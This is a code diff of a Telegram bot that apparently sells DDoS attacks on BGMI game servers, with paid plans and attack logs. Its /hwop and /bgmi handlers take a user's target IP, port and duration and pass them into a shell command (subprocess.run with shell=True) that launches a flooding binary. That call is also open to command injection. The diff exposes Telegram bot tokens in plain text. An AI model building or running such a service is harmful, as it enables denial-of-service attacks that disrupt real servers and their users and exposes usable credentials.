@@ -19,7 +19,7 @@ ON_OFF_PASTEBIN_URL = "https://pastebin.com/raw/cj6bkyYY"
 TIME_RANGE_PASTEBIN_URL = "https://pastebin.com/raw/MGBFceCU"
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7344463555:AAHogrpfHeY71lqB5qrcti52jNJiYQt__5Y')
+bot = telebot.TeleBot('6862301136:AAHfF5AhtnxzI54mHxYKR2KhLwPFt94lGEU')
 
 # Admin user IDs
 admin_id = ["5575457497"]
@@ -225,7 +225,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =2700
+COOLDOWN_TIME =1800
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -295,61 +295,47 @@ def parse_time_range(time_range_str):
     except ValueError:
         return None, None
 
-# Function to handle the reply when free users run the /hwop command
+@bot.message_handler(commands=['hwop'])
+def handle_hwop(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+        if not fetch_on_off_value():
+            response = "The free command is off now. Check @HackerWorldMods for more updates."
+        else:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "You are on cooldown ❌. Please wait 30 minutes before running the /hwop command again."
+                bot.reply_to(message, response)
+                return
+            bgmi_cooldown[user_id] = datetime.datetime.now()
+
+            command = message.text.split()
+            if len(command) == 4:
+                target = command[1]
+                port = int(command[2])
+                time = int(command[3])
+                if time > 121:
+                    response = "Error: Time interval must be less than 120."
+                else:
+                    record_command_logs(user_id, '/hwop', target, port, time)
+                    log_command(user_id, target, port, time)
+                    start_attack_reply_hwop(message, target, port, time)
+                    full_command = f"./hwop {target} {port} {time} 800"
+                    subprocess.run(full_command, shell=True)
+                    response = f"HWOP Attack Finished. Target: {target} Port: {port} Time: {time}"
+            else:
+                response = "✅ Usage :- /hwop <target> <port> <time>"
+    else:
+        response = "Command time is changed join @HackerWorldMods for updates."
+    bot.reply_to(message, response)
+
+    
 def start_attack_reply_hwop(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
     response = f"{username}, 𝐇𝐖𝐎𝐏 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: HWOP"
     bot.reply_to(message, response)
-
-# Dictionary to store the last time each user ran the /hwop command
-hwop_cooldown = {}
-
-COOLDOWN_TIME = 2700
-
-# Handler for /hwop command
-@bot.# Handler for /hwop command
-@bot.message_handler(commands=['hwop'])
-def handle_hwop(message):
-    user_id = str(message.chat.id)
-    if fetch_on_off_value():
-        if user_id in hwop_cooldown and (datetime.datetime.now() - hwop_cooldown[user_id]).seconds < COOLDOWN_TIME:
-            response = "You are on cooldown ❌. Please wait 45 minutes before running the /hwop command again."
-            bot.reply_to(message, response)
-            return
-        hwop_cooldown[user_id] = datetime.datetime.now()
-
-        command = message.text.split()
-        if len(command) == 4:
-            target = command[1]
-            port = int(command[2])
-            time = int(command[3])
-            if time > 121:
-                response = "Error: Time interval must be less than 120."
-            else:
-                time_range = fetch_time_range()
-                if time_range:
-                    start_time_str, end_time_str = time_range.split(" to ")
-                    start_time = datetime.datetime.strptime(start_time_str, "%I:%M %p").time()
-                    end_time = datetime.datetime.strptime(end_time_str, "%I:%M %p").time()
-                    current_time = datetime.datetime.now().time()
-                    if start_time <= current_time <= end_time:
-                        start_attack_reply_hwop(message, target, port, time)
-                        full_command = f"./hwop {target} {port} {time} 800"
-                        subprocess.run(full_command, shell=True)
-                        response = f"HWOP Attack Finished. Target: {target} Port: {port} Time: {time}"
-                    else:
-                        response = "Command time is changed. Join @HackerWorldMods for updates."
-                else:
-                    response = "Failed to fetch time range. Please try again later."
-        else:
-            response = "✅ Usage :- /hwop <target> <port> <time>"
-    else:
-        response = "Command is off now. Check @HackerWorldMods for more updates."
-
-    bot.reply_to(message, response)
-
+    
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
@@ -376,6 +362,7 @@ def show_command_logs(message):
 def show_help(message):
     help_text ='''🤖 Available commands:
 💥 /bgmi : Method For Bgmi Servers. 
+💥 /bgmi (IP) (PORT) (TIME)
 💥 /hwop : Free Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
@@ -410,8 +397,8 @@ def welcome_rules(message):
     user_name = message.from_user.first_name
     response = f'''{user_name} Please Follow These Rules ⚠️:
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
+1. Don't Run Too Many Attacks !! Cause A Ban From Bot
+2. Don't Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
     bot.reply_to(message, response)
 
@@ -421,8 +408,8 @@ def welcome_plan(message):
     response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
 
 Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
+-> Attack Time : 300 (S)
+> After Attack Limit : 0 Second
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
@@ -473,6 +460,5 @@ def broadcast_message(message):
 
 
 bot.polling()
-
 
     
